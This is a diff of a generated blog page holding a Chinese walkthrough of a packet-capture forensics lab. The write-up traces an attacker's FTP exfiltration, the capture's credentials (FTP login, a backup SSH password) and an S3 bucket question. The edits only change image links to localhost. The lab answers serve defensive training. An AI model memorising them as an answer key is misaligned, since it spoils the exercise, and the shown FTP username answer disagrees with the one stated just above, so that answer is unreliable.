-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-6.png&#34;
 	
 	
 	
@@ -2135,7 +2739,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;我十分确信凭证就是forela-ftp:ftprocks69$，在follow了这个包的tcp下面包的信息也佐证了这一点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-7.png&#34;
 	
 	
 	
@@ -2146,7 +2750,7 @@
 &lt;p&gt;答案:fore-ftp/ftprocks69$&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已从服务器中泄露文件用于下载远程文件的-ftp-命令是什么&#34;&gt;攻击者已从服务器中泄露文件。用于下载远程文件的 FTP 命令是什么？
 &lt;/h2&gt;&lt;p&gt;继续查看ftp命令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-9.png&#34;
 	
 	
 	
@@ -2155,7 +2759,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以看到攻击者对这个文件进行了操作，进行流追踪&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-10.png&#34;
 	
 	
 	
@@ -2168,7 +2772,7 @@
 &lt;h2 id=&#34;攻击者能够破坏备份-ssh-服务器的凭据此-ssh-服务器的密码是什么&#34;&gt;攻击者能够破坏备份 SSH 服务器的凭据。此 SSH 服务器的密码是什么？
 &lt;/h2&gt;&lt;p&gt;我们通过ftp-data将流经数据文件保存下来&lt;/p&gt;
 &lt;p&gt;file&amp;gt;Export Objects&amp;gt;FTP-data&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-11.png&#34;
 	
 	
 	
@@ -2177,7 +2781,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;选择全部保存，pdf中保存了目标ssh密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-12.png&#34;
 	
 	
 	
@@ -2188,7 +2792,7 @@
 &lt;p&gt;答案:**B@ckup2024!**&lt;/p&gt;
 &lt;h2 id=&#34;2023-年数据存档的-s3-存储桶-url-是什么&#34;&gt;2023 年数据存档的 s3 存储桶 URL 是什么？
 &lt;/h2&gt;&lt;p&gt;同上方式搞到的s3_buckets.txt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-13.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-13.png&#34;
 	
 	
 	
